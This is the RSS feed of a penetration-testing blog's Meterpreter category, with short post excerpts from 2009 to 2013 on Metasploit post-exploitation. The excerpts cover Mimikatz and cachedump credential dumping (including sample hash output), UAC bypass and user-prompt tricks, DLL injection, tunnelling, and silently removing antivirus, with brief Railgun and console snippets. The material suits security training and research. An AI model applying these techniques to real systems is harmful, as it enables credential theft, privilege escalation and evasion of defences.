<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Meterpreter on </title>
    <link>https://malicious.link/categories/meterpreter/</link>
    <description>Recent content in Meterpreter on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 07 Jun 2013 15:00:08 +0000</lastBuildDate>
    
	<atom:link href="https://malicious.link/categories/meterpreter/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</title>
      <link>https://malicious.link/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</link>
      <pubDate>Fri, 07 Jun 2013 15:00:08 +0000</pubDate>
      
      <guid>https://malicious.link/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</guid>
      <description>Mimikatz is now built into Metasploit&amp;rsquo;s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don&amp;rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&amp;rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.</description>
    </item>
    
    <item>
      <title>Sessiondump Meterpreter Extension</title>
      <link>https://malicious.link/post/2013/2013-04-08-sessiondump-meterpreter-extension/</link>
      <pubDate>Mon, 08 Apr 2013 09:58:20 +0000</pubDate>
      
      <guid>https://malicious.link/post/2013/2013-04-08-sessiondump-meterpreter-extension/</guid>
      <description>Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory {link} - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.
Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:</description>
    </item>
    
    <item>
      <title>Finding Admin Access</title>
      <link>https://malicious.link/post/2012/2012-10-31-finding-admin-access/</link>
      <pubDate>Wed, 31 Oct 2012 01:28:22 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-31-finding-admin-access/</guid>
      <description>You&amp;rsquo;ve got shell, and a set of credentials but you&amp;rsquo;re coming up empty on what you can do with those credentials. This is especially problematic when you can&amp;rsquo;t get past UAC as you are either in a AlwaysNotify situation or not a local admin.
(I&amp;rsquo;m not trying to pull some some &amp;ldquo;insert magic here&amp;rdquo; on the assumption of credentials just at the time of this writing I have only just started working (created a blank file) on a post module to do this as your current user, so until then, you need credentials)</description>
    </item>
    
    <item>
      <title>BypassUAC got a facelift</title>
      <link>https://malicious.link/post/2012/2012-10-30-bypassuac-got-a-facelift/</link>
      <pubDate>Tue, 30 Oct 2012 20:05:21 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-30-bypassuac-got-a-facelift/</guid>
      <description>Dave Kennedy and Kevin Mitnick submitted the &amp;ldquo;bypassuac&amp;rdquo; post module to Metasploit a while back (last DerbyCon?). Which is awesome and they did some fantastic work, but I had a few complaints as probably anyone did who used the module on a somewhat modern network.
&amp;ldquo;Old&amp;rdquo; module post/windows/escalate/bypassuac:
I decided to give it a bit of a face lift:
&amp;ldquo;New&amp;rdquo; local exploit module exploit/windows/local/bypassuac:
All of the credit for the availability of this module goes to @egyp7 though, without his epic addition of local exploits to Metasploit the majority of the updates to this module wouldn&amp;rsquo;t be possible.</description>
    </item>
    
    <item>
      <title>Mounting SMB shares over Meterpreter</title>
      <link>https://malicious.link/post/2012/2012-10-17-mounting-smb-shares-over-meterpreter/</link>
      <pubDate>Wed, 17 Oct 2012 17:52:30 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-17-mounting-smb-shares-over-meterpreter/</guid>
      <description>Ok, this is pretty straight forward no magic:
Got a shell, doesn&amp;rsquo;t have to be SYSTEM
Add a route to the internal range or directly to the host you want over the session you want
Mosy on over to the Socks4a module. And in another terminal we need to make sure our proxychains.conf file in /etc/ or where ever you store your conf is correct. It defaults to 9050 on 127.</description>
    </item>
    
    <item>
      <title>Free Shells with Plink and Pageant</title>
      <link>https://malicious.link/post/2012/2012-08-28-free-shells-with-plink-and-pageant/</link>
      <pubDate>Tue, 28 Aug 2012 15:42:03 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-08-28-free-shells-with-plink-and-pageant/</guid>
      <description>Watching Egypt’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with:
meterpreter &amp;gt; run enum_putty [*] Putty Installed for [[&amp;quot;Administrator&amp;quot;]] [*] Saved SSH Server Public Keys: [*] rsa2@22:172.16.10.150 [*] Session corp_webserver: [*] Protocol: SSH [*] Hostname: 172.16.10.150 [*] Username: root [*] Public Key: meterpreter &amp;gt;  Awesome, this guy runs as root and we have the IP address.</description>
    </item>
    
    <item>
      <title>Raising Zombies in Windows: Part 1 - Passwords</title>
      <link>https://malicious.link/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</link>
      <pubDate>Tue, 31 Jul 2012 20:20:15 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</guid>
      <description>With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&amp;rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&amp;rsquo;t really appreciative of our (pentester/red teamer)&amp;rsquo;s schedule.
A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &amp;lsquo;runas.exe&amp;rsquo;:
w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&amp;rsquo;re good right?</description>
    </item>
    
    <item>
      <title>Netstat Post Module for Meterpreter</title>
      <link>https://malicious.link/post/2012/2012-06-28-netstat-post-module-for-meterpreter/</link>
      <pubDate>Thu, 28 Jun 2012 13:18:52 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-06-28-netstat-post-module-for-meterpreter/</guid>
      <description>Submitted it to MSF via pull request here: https://github.com/rapid7/metasploit-framework/pull/538
Added to trunk: https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb
I promised this one a while ago, sorry for the delay. This only does TCP, it&amp;rsquo;d be trivial to do UDP as well but never really found anything interesting and actively going on on the UDP side. It&amp;rsquo;s real simple, first we&amp;rsquo;ve gotta add the GetTcpTable function to railgun:
session.railgun.add_function(&#39;iphlpapi&#39;, &#39;GetTcpTable&#39;, &#39;DWORD&#39;, [ [&#39;PBLOB&#39;, &#39;pTcpTable&#39;, &#39;out&#39;], [&#39;PDWORD&#39;, &#39;pdwSize&#39;, &#39;inout&#39;], [&#39;BOOL&#39;, &#39;bOrder&#39;, &#39;in&#39;] ])  Then gauge the size of the table:</description>
    </item>
    
    <item>
      <title>(UAC) User Assisted Compromise</title>
      <link>https://malicious.link/post/2012/2012-01-03-uac-user-assisted-compromise/</link>
      <pubDate>Tue, 03 Jan 2012 06:56:22 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-01-03-uac-user-assisted-compromise/</guid>
      <description>A number of times during tests I&amp;rsquo;ve actually run into those mythical creatures called &amp;ldquo;patched windows machines&amp;rdquo;. At DerbyCon Chris Gates and I released the &amp;ldquo;Ask&amp;rdquo; post module (which I had failed to publish). This module very simply uses the ShellExecute windows function.aspx&amp;rdquo;) via Railgun with the undocumented (but very well known) operator of &amp;lsquo;runas&amp;rsquo;. These two lines accomplished that:
client.railgun.add_function( &#39;shell32&#39;, &#39;ShellExecuteA&#39;, &#39;DWORD&#39;,[[&amp;quot;DWORD&amp;quot;,&amp;quot;hwnd&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpOperation&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpFile&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpParameters&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpDirectory&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;DWORD&amp;quot;,&amp;quot;nShowCmd&amp;quot;,&amp;quot;in&amp;quot;],]) client.railgun.shell32.ShellExecuteA(nil,&amp;quot;runas&amp;quot;,&amp;quot;evil.exe&amp;quot;,nil,nil,5)  This would quite simply prompt the user with that annoying UAC prompt asking the user to run &amp;lsquo;evil.</description>
    </item>
    
    <item>
      <title>Run POST Modules On All Sessions</title>
      <link>https://malicious.link/post/2011/2011-11-02-run-post-modules-on-all-sessions/</link>
      <pubDate>Wed, 02 Nov 2011 03:06:18 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-11-02-run-post-modules-on-all-sessions/</guid>
      <description>Jcran recently blogged about an easy way to run a post module on all sessions:
http://blog.pentestify.com/simple-framework-domain-token-scanner
msf&amp;gt; use post/windows/gather/enum_domain_tokens msf enum_domain_tokens&amp;gt; irb framework.sessions.each do |session| run_single(&amp;quot;set SESSION #{session.first}&amp;quot;) run_single(&amp;quot;run&amp;quot;) sleep 1 end  You use the POST module, drop to IRB and run those 4 lines, and bam, you win. With resource files we can automate this a bit more and have it so that we do this effortlessly with any post module.</description>
    </item>
    
    <item>
      <title>The Dirty Little Secrets They Didn&#39;t Teach You In Pentesting Class</title>
      <link>https://malicious.link/post/2011/2011-10-06-the-dirty-little-secrets-they-didnt-teach-you-in-pentesting/</link>
      <pubDate>Thu, 06 Oct 2011 15:53:11 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-10-06-the-dirty-little-secrets-they-didnt-teach-you-in-pentesting/</guid>
      <description>Video:  Slides: The Dirty Little Secrets They Didn&amp;rsquo;t Teach You In Pentesting Class [slideshare id=9530403]
Code: https://github.com/mubix/Not-In-Pentesting-Class</description>
    </item>
    
    <item>
      <title>Create a 64bit Process From a x86/32bit One</title>
      <link>https://malicious.link/post/2011/2011-09-28-create-a-64bit-process-from-a-x8632bit-one/</link>
      <pubDate>Wed, 28 Sep 2011 05:45:22 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-09-28-create-a-64bit-process-from-a-x8632bit-one/</guid>
      <description>On Vista and above there is a Windows &amp;lsquo;Redirector&amp;rsquo; (A redirector is basically a Symlink or fake directory that&amp;rsquo;s there but not in Windows) (more info here.aspx&amp;rdquo;)) that allows a 32bit process create a 64bit one. For anyone who has tried to run &amp;lsquo;execute -H -c -f notepad.exe&amp;rsquo;, they know that if they are in a 32bit process, they get a 32bit notepad even if they are on a 64bit system, which is annoying.</description>
    </item>
    
    <item>
      <title>Who Is Logged In? A Quick Way To Pick Your Targets</title>
      <link>https://malicious.link/post/2011/2011-09-17-who-is-logged-in-a-quick-way-to-pick-your-targets/</link>
      <pubDate>Sat, 17 Sep 2011 02:37:31 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-09-17-who-is-logged-in-a-quick-way-to-pick-your-targets/</guid>
      <description>Say you go for the 500+ shells on an internal test or your phishing exersice goes way better than you thought. Well you need to get your bearings quickly and going into each shell and doing a ps, then looking through the list for all the users logged in is a bit of a pain and defintely not ideal.
I wrote a quick script that you can throw in the meterpreter scripts folder to aide you a bit with this:</description>
    </item>
    
    <item>
      <title>IP Resolution Using Meterpreter’s Railgun</title>
      <link>https://malicious.link/post/2011/2011-08-19-ip-resolution-using-meterpreters-railgun/</link>
      <pubDate>Fri, 19 Aug 2011 19:26:55 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-08-19-ip-resolution-using-meterpreters-railgun/</guid>
      <description>I saw a post back in June and it just recently came up again:
http://www.securityartwork.es/2011/06/01/dns-port-forwarding-con-meterpreter/
It looked like a lot of hard work to set that up and I&amp;rsquo;m really lazy. I didn&amp;rsquo;t want to have to go through all that every time I got onto a new network. So, I made a very simple meterpreter post module to just call a Windows API key called &amp;lsquo;gethostbyaddr&amp;rsquo; using Railgun.
TL:DR; You can download the post module here: ipresolver.</description>
    </item>
    
    <item>
      <title>Remotely Suspend All Threads with Meterpreter</title>
      <link>https://malicious.link/post/2011/2011-05-30-remotely-suspend-all-threads-with-meterpreter/</link>
      <pubDate>Mon, 30 May 2011 21:52:59 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-05-30-remotely-suspend-all-threads-with-meterpreter/</guid>
      <description>Just a follow up to my previous post. One of the things that sets that method apart is the fact that the suspension (once the DLL injection occurs) comes from within the process, and it suspends all the child processes as well.
Another way you can do this without the injection is just sending a suspend to all the threads in the process.
pid = 2980 targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS) targetprocess.</description>
    </item>
    
    <item>
      <title>Remote DLL Injection with Meterpreter</title>
      <link>https://malicious.link/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/</link>
      <pubDate>Mon, 30 May 2011 16:35:40 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/</guid>
      <description>Recently Didier Stevens wrote &amp;lsquo;Suspender.dll&amp;rsquo; which is a DLL that will suspend a process and all of it&amp;rsquo;s child processes after a delay. 60 seconds is it&amp;rsquo;s default but you can rename the DLL to add a number (as such &amp;lsquo;Suspender10.dll&amp;rsquo; for 10 seconds) to make the delay whatever you wish. You can find the blog post and download here: http://blog.didierstevens.com/2011/04/27/suspender-dll/
Jonathan Cran and I had the same idea, as I&amp;rsquo;m sure many others did as well.</description>
    </item>
    
    <item>
      <title>Dumping Hashes on Win2k8 R2 x64 with Metasploit</title>
      <link>https://malicious.link/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</link>
      <pubDate>Mon, 16 May 2011 02:35:31 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</guid>
      <description>When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &amp;ldquo;The parameter is incorrect&amp;rdquo; error in meterpreter. So I&amp;rsquo;ve had to fall back on dropping binaries which I really don&amp;rsquo;t like doing because of the added clean up and chance of getting &amp;lsquo;caught&amp;rsquo;. Well, with a bit of migration you&amp;rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:</description>
    </item>
    
    <item>
      <title>Metasploit VNC Password Extraction</title>
      <link>https://malicious.link/post/2011/2011-03-21-metasploit-vnc-password-extraction/</link>
      <pubDate>Mon, 21 Mar 2011 02:12:29 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-03-21-metasploit-vnc-password-extraction/</guid>
      <description>Chris Gates wrote a blog post about the &amp;lsquo;getvncpw&amp;rsquo; meterpreter script. I ran into the same issue on Penetration Tests in the past but didn&amp;rsquo;t know much about the wacked out version of DES that RFB (the VNC protocol) was using. Not being a fan of manually editing a binary and compiling each time I had a password to crack I wanted to find another way, but didn&amp;rsquo;t get a chance to.</description>
    </item>
    
    <item>
      <title>Cachedump for Meterpreter in action</title>
      <link>https://malicious.link/post/2011/2011-02-14-cachedump-for-meterpreter-in-action/</link>
      <pubDate>Mon, 14 Feb 2011 22:03:37 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-02-14-cachedump-for-meterpreter-in-action/</guid>
      <description>Update: Cachedump has been added to the Metasploit trunk:
https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946
Pull it down:
wget http://lab.mediaservice.net/code/cachedump.rb  put it here: /(metasploitdir)/modules/post/windows/gather
Load up console and pwn something then (MAKE SURE YOU ARE SYSTEM):
meterpreter &amp;gt; run post/windows/gather/cachedump [*] Executing module against WORKSTATION244 [*] Obtaining the boot key... [*] Trying &#39;XP&#39; style... [*] Getting PolSecretEncryptionKey... [*] XP compatible client [*] Lsa Key: 29249a6480f428cb6dacba2d30d5292c [*] Getting LK$KM... [*] Dumping cached credentials... Username : jdoe Hash : 592cdfbc3f1ef77ae95c75f851e37166 Last login : 2010-05-11 01:43:48 DNS Domain Name : CONTOSO.</description>
    </item>
    
    <item>
      <title>Silently uninstall SEP</title>
      <link>https://malicious.link/post/2010/2010-11-16-silently-uninstall-sep-html/</link>
      <pubDate>Tue, 16 Nov 2010 05:00:00 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-11-16-silently-uninstall-sep-html/</guid>
      <description>Uninstallation is not new
Deleting and removing things on a box you own isn&amp;rsquo;t new
This method and how to do it remotely was posted in Feb 2007
But I didn&amp;rsquo;t know how to do it, and I thought it was hilarious, so I made a video:
 </description>
    </item>
    
    <item>
      <title>Am I an Admin? Railgun Script</title>
      <link>https://malicious.link/post/2010/2010-09-13-am-i-an-admin-railgun-script/</link>
      <pubDate>Mon, 13 Sep 2010 17:45:31 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-09-13-am-i-an-admin-railgun-script/</guid>
      <description>When you first step on a machine, you want to determine quickly if you are just a user or an administrator. Meterpreter doesn&amp;rsquo;t have a way to quickly check this. You could drop to a shell, check the local users group &amp;ldquo;Adminitrators&amp;rdquo;, and check your user, and correlate any groups that are shared between the outputs. You could do &amp;lsquo;getsystem&amp;rsquo; and if one works other than Kitrap0d. You could also just do a &amp;lsquo;ps&amp;rsquo; and notice that you can see &amp;lsquo;SYSTEM&amp;rsquo; processes.</description>
    </item>
    
    <item>
      <title>Rapid fire PSEXEC for Metasploit</title>
      <link>https://malicious.link/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/</link>
      <pubDate>Sun, 12 Sep 2010 15:06:39 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/</guid>
      <description>Exploit modules inside of metasploit don&amp;rsquo;t have the ability to run on multiple hosts with one swing of the bat. So I created some code to facilitate that. It&amp;rsquo;s really not much but there are some really juicy pieces of knowledge I learned on the way here.
// The following is a resource file, but instead of just giving you something to download or straight copy and paste, I&amp;rsquo;ve broken it up into sections.</description>
    </item>
    
    <item>
      <title>Intro to RailGun: WIN API for Meterpreter</title>
      <link>https://malicious.link/post/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/</link>
      <pubDate>Thu, 08 Jul 2010 02:10:34 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/</guid>
      <description>Back on June 13th, &amp;ldquo;Patrick HVE&amp;rdquo; released RAILGUN:
http://mail.metasploit.com/pipermail/framework/2010-June/006382.html
And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712: http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712
Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls:
 iphlpapi ws2_32 kernel32 ntdll user32 advapi32  (You can find out exactly what functions are available by default in the api.</description>
    </item>
    
    <item>
      <title>Set Wallpaper Meterpreter Script</title>
      <link>https://malicious.link/post/2010/2010-06-28-set-wallpaper-meterpreter-script/</link>
      <pubDate>Mon, 28 Jun 2010 20:34:43 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-06-28-set-wallpaper-meterpreter-script/</guid>
      <description>Certainly nothing to fuss over, but I&amp;rsquo;ve had a fascination with setting my target&amp;rsquo;s wallpaper as sort of a calling card for years now. I&amp;rsquo;ve been able to set the registry key (HKCUControl PanelDesktopWallpaper), but until recently I didn&amp;rsquo;t know how to get it to refresh so that it displayed without forcing the user to log out&amp;hellip;
First, is the most important part, selection of the wallpaper. This is my first selection:</description>
    </item>
    
    <item>
      <title>Meterpreter tunneling and VNC revamped</title>
      <link>https://malicious.link/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/</link>
      <pubDate>Tue, 15 Dec 2009 13:00:37 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/</guid>
      <description>So yesterday (December 14th, 2009) HD Moore posted a tweet with a pic of the new VNC meterpreter script that he wrote:
Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.
https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb
Or you can get it via the SVN at Revision 7872
By creating a bind payload instead of a reverse connect we can have the payload listen locally.</description>
    </item>
    
    <item>
      <title>Packet Captures with Meterpreter - 7zip - WinDump - and Nmap-ish</title>
      <link>https://malicious.link/post/2009/2009-10-03-packet-captures-with-meterpreter-7zip-windump-and-nmap-ish/</link>
      <pubDate>Sat, 03 Oct 2009 02:24:05 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-10-03-packet-captures-with-meterpreter-7zip-windump-and-nmap-ish/</guid>
      <description>So this is a pretty crafty way of getting packet captures on a target system. Definitely could be streamlined with some meterpreter scripting fu, but awesome job on the video.
 Metasploit meterpreter Windump/Winpcap sniffer from siles on Vimeo.</description>
    </item>
    
    <item>
      <title>Metasploit Framework as a Payload</title>
      <link>https://malicious.link/post/2009/2009-06-26-metasploit-framework-as-a-payload/</link>
      <pubDate>Fri, 26 Jun 2009 05:45:08 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-06-26-metasploit-framework-as-a-payload/</guid>
      <description>Well, sorta…
I created a meterpreter script that takes the cygwin bundled version of Metasploit inside of a NullSoft installer that HD Moore created and deploys it using meterpreter to the compromised host, extracts/installs it, and runs the shell. Now I left this intentionally open so that you could package your own cygwin bundle (possibly with nmap and netcat), for your own evil fun.
Thanks defintely go to Carlos Perez (Dark0perator) and HD Moore for their help getting this bad boy working right.</description>
    </item>
    
  </channel>
</rss>